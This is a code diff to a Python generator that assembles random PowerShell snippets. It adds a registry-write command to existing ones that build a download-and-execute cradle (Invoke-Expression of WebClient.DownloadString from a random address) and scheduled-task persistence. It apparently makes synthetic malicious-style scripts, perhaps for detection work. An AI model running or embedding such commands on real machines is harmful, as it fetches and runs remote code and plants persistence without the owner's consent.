@@ -15,6 +15,17 @@ def get_random_dest():
 		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
 		return ip + path
 
+def get_random_text(min, max):
+	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])
+
+def get_random_word():
+	return get_random_text(3,10)
+
+def get_random_regkey():
+	key_name = get_random_word()
+	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
+	return key_name, key_location
+
 def remote_payload_cmd():
 	ip = get_random_dest()
 	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"
@@ -25,13 +36,20 @@ def persistence_cmd():
 	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
 	return cmd
 
-commands = [remote_payload_cmd, persistence_cmd]
+def registry_key_cmd():
+	cmd = "$code = \"" + get_random_text(50,100) + "\"\n"
+	key_location, key_name = get_random_regkey()
+	cmd += "Set-ItemProperty \"HKCU:\\" + key_location + "\\\" -Name " + key_name + " -Value " + "$code \n"
+	return cmd
+
+#TODO: set_registry_key_cmd
+commands = [remote_payload_cmd, persistence_cmd, registry_key_cmd]
 
 def generate_script():
 	script = ""
-
-	for f in [random.choice(commands) for _ in range(5)]:
-		script+=f()
+	script+= random.choice(commands)()
+	#for f in [random.choice(commands) for _ in range(5)]:
+		#script+=f()
 
 	return script
 
